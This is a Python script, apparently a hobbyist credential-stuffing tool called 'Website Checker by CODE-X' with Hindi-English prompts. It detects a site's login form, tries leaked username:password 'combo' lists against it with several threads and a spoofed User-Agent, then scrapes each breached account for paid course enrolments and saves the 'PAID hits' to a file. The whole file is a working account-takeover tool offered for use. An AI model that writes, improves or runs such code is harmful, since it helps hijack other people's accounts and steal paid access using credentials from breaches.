import requests
import os
import time
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════
#   WEBSITE CHECKER — CODE-X
# ═══════════════════════════════════════════

checked = 0
hits    = []
failed  = []
total   = 0

def clear():
    os.system('clear')

def print_stats():
    clear()
    print("\033[91m  ╔══════════════════════════════════════╗")
    print("  ║     W E B S I T E  C H E C K E R    ║")
    print("  ║          by  C O D E - X             ║")
    print("  ╠══════════════════════════════════════╣")
    print(f"  ║  Total   : {str(total).ljust(6)} Checked : {str(checked).ljust(9)}║")
    print(f"  ║  ✅ Paid  : {str(len(hits)).ljust(6)} ❌ Failed: {str(len(failed)).ljust(9)}║")
    print("  ╚══════════════════════════════════════╝\033[0m\n")

def detect_form(url):
    try:
        s = requests.Session()
        r = s.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        u_field = p_field = None
        action  = url

        for form in soup.find_all('form'):
            for inp in form.find_all('input'):
                t = inp.get('type','').lower()
                n = inp.get('name','').lower()
                i = inp.get('id','').lower()
                if t == 'password':
                    p_field = inp.get('name') or inp.get('id')
                if t in ['text','email','tel'] or any(x in n+i for x in ['user','email','phone','mobile','login']):
                    u_field = inp.get('name') or inp.get('id')
            a = form.get('action','')
            if a:
                from urllib.parse import urljoin
                action = urljoin(url, a) if not a.startswith('http') else a
            if u_field and p_field:
                break
        return s, action, u_field, p_field
    except:
        return None, url, None, None

def get_courses(session, base_url, response):
    courses = []
    plan    = "FREE"
    text    = response.text.lower()
    soup    = BeautifulSoup(response.text, 'html.parser')

    paid_words = ['premium','pro','paid','purchased','enrolled','batch','bought','order']
    for w in paid_words:
        if w in text:
            plan = "PAID"
            break

    from urllib.parse import urljoin
    for a in soup.find_all('a', href=True):
        href = a['href'].lower()
        if any(x in href for x in ['course','batch','enrolled','my-course','dashboard','purchase']):
            try:
                cr   = session.get(urljoin(base_url, a['href']), timeout=8)
                cs   = BeautifulSoup(cr.text, 'html.parser')
                for tag in cs.find_all(['h1','h2','h3','h4']):
                    t = tag.get_text(strip=True)
                    if 5 < len(t) < 80 and t not in courses:
                        courses.append(t)
                if len(courses) >= 5:
                    break
            except:
                pass

    return plan, courses[:5]

def is_logged_in(response):
    text = response.text.lower()
    url  = response.url.lower()

    fail_words = ['invalid','incorrect','wrong','error','failed','does not exist','please try again','invalid password']
    for w in fail_words:
        if w in text:
            return False

    success_words = ['dashboard','logout','log out','sign out','my account','my profile','welcome','my courses','enrolled','purchase','order']
    for w in success_words:
        if w in text or w in url:
            return True

    if 'login' not in url and 'signin' not in url:
        return True

    return False

def parse_combo(line):
    parts = line.strip().split(':')
    if len(parts) < 2:
        return None, None
    if '@' in parts[0]:
        return parts[0], ':'.join(parts[1:])
    if parts[0].replace('+','').isdigit():
        return parts[0], ':'.join(parts[1:])
    return parts[0], ':'.join(parts[1:])

def check_one(url, form_action, u_field, p_field, combo, delay):
    global checked
    username, password = parse_combo(combo)
    if not username or not password:
        return "skip", combo, None, []

    session = requests.Session()
    try:
        session.get(url, timeout=10)
        data = {u_field: username, p_field: password}
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10)', 'Referer': url}
        r = session.post(form_action, data=data, headers=headers, timeout=10, allow_redirects=True)
        time.sleep(delay)
        checked += 1

        if is_logged_in(r):
            plan, courses = get_courses(session, url, r)
            return "hit", combo, plan, courses
        else:
            checked += 0
            return "bad", combo, None, []
    except:
        checked += 1
        return "error", combo, None, []

def main():
    global total

    print_stats()

    print("\033[96m[*] Details Daalo:\033[0m\n")
    url        = input("  Website Login URL           : ").strip()
    combo_path = input("  Combo File Path (.txt)      : ").strip()
    threads    = int(input("  Threads (1-3)               : ").strip())
    delay      = float(input("  Delay seconds (e.g. 1)      : ").strip())

    hits_file   = "/sdcard/Download/CodeX-PAID.txt"
    failed_file = "/sdcard/Download/CodeX-FAILED.txt"

    print("\n\033[93m[*] Form detect ho raha hai...\033[0m")
    _, form_action, u_field, p_field = detect_form(url)

    if not u_field or not p_field:
        print("\033[91m[!] Auto detect nahi hua — manually daalo:\033[0m")
        u_field     = input("  Username field name : ").strip()
        p_field     = input("  Password field name : ").strip()
        form_action = input("  Form action URL     : ").strip() or url
    else:
        print(f"\033[92m[✓] Form detect hua!\033[0m")
        print(f"\033[92m    User Field : {u_field}\033[0m")
        print(f"\033[92m    Pass Field : {p_field}\033[0m\n")

    if not os.path.exists(combo_path):
        print(f"\033[91m[✗] File nahi mili: {combo_path}\033[0m")
        return

    with open(combo_path, 'r', errors='ignore') as f:
        combos = [l.strip() for l in f if ':' in l]

    total = len(combos)
    print(f"\033[93m[*] Total combos: {total} — Start!\033[0m\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(check_one, url, form_action, u_field, p_field, combo, delay): combo
            for combo in combos
        }

        for future in as_completed(futures):
            result, combo, plan, courses = future.result()

            if result == "hit":
                if plan == "PAID":
                    course_str = " | ".join(courses) if courses else "Course info nahi mili"
                    entry = f"{combo} | Courses: {course_str}"
                    hits.append(entry)
                    print_stats()
                    print(f"\033[92m[✅ PAID HIT] {combo}\033[0m")
                    print(f"\033[92m   📚 Courses : {course_str}\033[0m\n")
                else:
                    # Free — skip, no print
                    failed.append(combo)

            elif result in ["bad", "error", "skip"]:
                failed.append(combo)

            # Auto save every 5 hits
            if hits and len(hits) % 5 == 0:
                with open(hits_file, 'w') as f:
                    f.write('\n'.join(hits))

    # Final save
    with open(hits_file, 'w') as f:
        f.write('\n'.join(hits))
    with open(failed_file, 'w') as f:
        f.write('\n'.join(failed))

    print_stats()
    print(f"\033[92m  ✅ PAID Hits → {hits_file}\033[0m")
    print(f"\033[91m  ❌ Failed   → {failed_file}\033[0m\n")

main()
